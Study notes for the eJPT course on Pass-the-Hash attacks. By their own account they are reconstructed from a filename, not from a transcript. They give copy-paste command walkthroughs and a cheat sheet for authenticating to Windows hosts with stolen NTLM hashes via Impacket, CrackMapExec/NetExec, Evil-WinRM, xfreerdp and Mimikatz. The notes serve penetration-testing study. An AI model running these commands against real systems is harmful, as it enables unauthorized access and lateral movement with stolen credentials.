# 09 - Pass-The-Hash Attacks (eJPT Study Notes)

Note: No transcript was provided. The following is a conservative, lab-focused summary inferred from the filename and course module (05-WindowsCredentialDumping). Use these techniques only in environments where you have explicit authorization.

## What the video covers (Introduction / big picture)
- Concept: Pass-the-Hash (PTH) uses an NTLM password hash (instead of the plaintext password) to authenticate to Windows services. Because NTLM uses the hash as a secret in challenge-response, possession of the NT hash is sufficient to authenticate where NTLM is accepted.
- Context: After dumping credentials (SAM/LSASS, e.g., with secretsdump/mimikatz), PTH enables lateral movement to other Windows systems via SMB, WMI, WinRM, and RDP.
- Scope: When/where PTH works, interpreting dumped hash formats, validating credentials, and gaining shells using common tools (Impacket, CrackMapExec/NetExec, Evil-WinRM, xfreerdp, Mimikatz).

## Flow (ordered)
1. Pre-requisites:
   - You have obtained NTLM hashes (e.g., from SAM or LSASS).
   - You know the target IP/hostname and whether you’re using a local or domain account.
2. Parse the dump:
   - Identify LM and NT hashes from lines like: `Administrator:500:LMHASH:NTHASH:::`
   - LM is often `aad3b435b51404eeaad3b435b51404ee` (placeholder/empty).
3. Verify network paths:
   - Identify open services that accept NTLM: 445/139 (SMB), 5985/5986 (WinRM), 3389 (RDP).
4. Validate the hash quickly:
   - Use CrackMapExec/NetExec to test SMB auth and identity.
5. Choose an execution method:
   - SMB-based (impacket-psexec/wmiexec/smbexec) for command shells.
   - WinRM (evil-winrm) for PowerShell sessions (if 5985/5986 open and WinRM enabled).
   - RDP (xfreerdp /pth) for desktop access (if Remote Desktop enabled).
6. Get a shell and operate:
   - Run whoami, hostname, check privileges, pivot/dump more creds.
7. Troubleshoot pitfalls:
   - Domain vs local account context, UAC remote restrictions for local admins, service permissions, codepage issues, firewall rules.

## Tools highlighted
- Impacket suite:
  - psexec.py, wmiexec.py, smbexec.py for remote command execution via SMB/WMI.
  - smbclient.py for SMB sessions.
- CrackMapExec (CME) or NetExec (nxc): rapid validation and command execution via SMB.
- Evil-WinRM: interactive PowerShell over WinRM using NTLM hash.
- xfreerdp: RDP client supporting /pth for NTLM.
- Mimikatz (on-Windows PTH): create a process under stolen NTLM credentials (sekurlsa::pth).

## Typical command walkthrough (detailed, copy-paste friendly)
Set handy variables (adjust as needed):
```bash
# Attacker box (e.g., Kali)
export VICTIM=10.10.10.15
export USER=Administrator         # Or other admin user
export DOMAIN=CORP                # Use '.' for local account or actual domain (e.g., CORP)
export NT=8846f7eaee8fb117ad06bdd830b7586c   # Example NT hash (for "password")
export LM=aad3b435b51404eeaad3b435b51404ee   # Often this LM placeholder
# Optional if needed in domain contexts:
export DCIP=10.10.10.5           # Domain Controller IP (if specifying DOMAIN causes DC lookup issues)
```

1) Quick port check
```bash
nmap -Pn -p 445,139,5985,5986,3389 -sT -sV $VICTIM
```

2) Validate the hash with SMB (CME/NetExec)
```bash
# CrackMapExec
crackmapexec smb $VICTIM -u $USER -H $NT -d $DOMAIN
crackmapexec smb $VICTIM -u $USER -H $NT -d $DOMAIN -x "whoami && hostname"

# NetExec (CME successor)
nxc smb $VICTIM -u $USER -H $NT -d $DOMAIN
nxc smb $VICTIM -u $USER -H $NT -d $DOMAIN -x "whoami && hostname"
```

3) Impacket psexec (interactive SYSTEM shell via service)
```bash
# psexec; specify -hashes LM:NT. If LM unknown, you can use just :NT
psexec.py -hashes $LM:$NT $DOMAIN/$USER@$VICTIM

# If you need to force a specific DC (domain envs), add:
psexec.py -hashes $LM:$NT -dc-ip $DCIP $DOMAIN/$USER@$VICTIM

# If you see garbled output, add:
psexec.py -hashes $LM:$NT -codec utf-8 $DOMAIN/$USER@$VICTIM
```

4) Impacket wmiexec (semi-interactive, fileless WMI)
```bash
wmiexec.py -hashes $LM:$NT $DOMAIN/$USER@$VICTIM
# Optional:
wmiexec.py -hashes $LM:$NT -dc-ip $DCIP $DOMAIN/$USER@$VICTIM
```

5) Impacket smbexec (alternate SMB exec method)
```bash
smbexec.py -hashes $LM:$NT $DOMAIN/$USER@$VICTIM
```

6) Evil-WinRM (PowerShell over WinRM)
```bash
# WinRM HTTP (5985)
evil-winrm -i $VICTIM -u $USER -H $NT

# WinRM HTTPS (5986)
evil-winrm -i $VICTIM -u $USER -H $NT -S

# If connection stalls, verify WinRM is enabled and port open, or try domain-less:
evil-winrm -i $VICTIM -u $USER -H $NT -r $DOMAIN
```

7) RDP using NTLM hash (xfreerdp)
```bash
# RDP with Pass-the-Hash; requires NLA and RDP enabled on target
xfreerdp /v:$VICTIM /u:$USER /d:$DOMAIN /pth:$NT /cert:ignore +clipboard
# For local accounts, try /d:. or omit /d
```

8) SMB client session using hash (Impacket smbclient.py)
```bash
# Browse shares or drop files via SMB with a hash
smbclient.py -hashes $LM:$NT $DOMAIN/$USER@$VICTIM
# Inside smbclient: use C$  (to access C drive), ls, put, get, etc.
```

9) On-Windows Pass-the-Hash with Mimikatz (create process as stolen identity)
```none
# On a Windows host where you have Mimikatz and an NT hash:
mimikatz.exe
privilege::debug
# Launch a new process (e.g., PowerShell) under the specified NTLM credentials:
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:powershell.exe
# In the spawned process, access remote resources as that identity (e.g., \\server\C$)
```

Notes on formats and flags:
- Hash formats from dumps commonly look like: `user:RID:LMHASH:NTHASH:::`. Use the NT hash; LM often equals `aad3b4...`.
- In Impacket, you can pass only the NT by using `-hashes :<NT>`.
- For local accounts with Impacket, you can use `.` or the target hostname instead of a domain: `./Administrator@IP`.
- For domain accounts, if name resolution/DC lookup fails, add `-dc-ip <DCIP>`.

## Practical tips
- Ports and services:
  - SMB-based methods need 445 open.
  - WinRM uses 5985 (HTTP) or 5986 (HTTPS).
  - RDP uses 3389 and must have NLA/Remote Desktop enabled.
- Permissions:
  - Psexec/smbexec often require local admin on the target.
  - UAC remote restrictions can limit local admin tokens over the network; domain admin or proper policy settings may be needed for full admin over SMB/WinRM.
- Shell choice:
  - psexec yields a service-based SYSTEM shell (good for privesc and dumping).
  - wmiexec is fileless and stable for single commands/interactive prompt.
  - evil-winrm provides rich PowerShell interaction (file upload/download, scripts).
- Encoding/logging:
  - Use `-codec utf-8` with Impacket if output is garbled.
  - PTH will generate Windows Security logs (Event ID 4624 Type 3 using NTLM; service creation 7045 for psexec).
- Common pitfalls:
  - Wrong domain/local context: try `DOMAIN/user` vs `./user`.
  - Firewalls: WinRM often blocked; prefer SMB first if 445 is open.
  - Account lockouts: repeated bad attempts may lock accounts—validate carefully with CME/NetExec before brute attempts.
- Hash hygiene:
  - Always work with the NT hash; LM is rarely used today.
  - From secretsdump, copy exactly the NTHASH (32 hex chars).

## Minimal cheat sheet (one-screen flow)
```bash
# Vars
export VICTIM=10.10.10.15
export USER=Administrator
export DOMAIN=CORP      # Or '.' for local
export NT=<NTHASH>
export LM=aad3b435b51404eeaad3b435b51404ee

# Quick validate via SMB
crackmapexec smb $VICTIM -u $USER -H $NT -d $DOMAIN
# or
nxc smb $VICTIM -u $USER -H $NT -d $DOMAIN

# SMB shells
psexec.py  -hashes $LM:$NT $DOMAIN/$USER@$VICTIM
wmiexec.py -hashes $LM:$NT $DOMAIN/$USER@$VICTIM
smbexec.py -hashes $LM:$NT $DOMAIN/$USER@$VICTIM

# WinRM PowerShell
evil-winrm -i $VICTIM -u $USER -H $NT

# RDP desktop
xfreerdp /v:$VICTIM /u:$USER /d:$DOMAIN /pth:$NT /cert:ignore

# SMB client
smbclient.py -hashes $LM:$NT $DOMAIN/$USER@$VICTIM
```

## Summary
- Pass-the-Hash leverages NTLM challenge-response to authenticate using the NT hash, enabling lateral movement without knowing plaintext passwords.
- After dumping hashes, validate them against reachable services and choose an execution channel (SMB psexec/wmiexec, WinRM, RDP).
- Impacket tools, CrackMapExec/NetExec, Evil-WinRM, and xfreerdp cover most PTH scenarios in labs.
- Mind domain vs local contexts, service reachability, and UAC remote restrictions. Use the NT hash accurately and prefer methods that fit the target’s exposed services.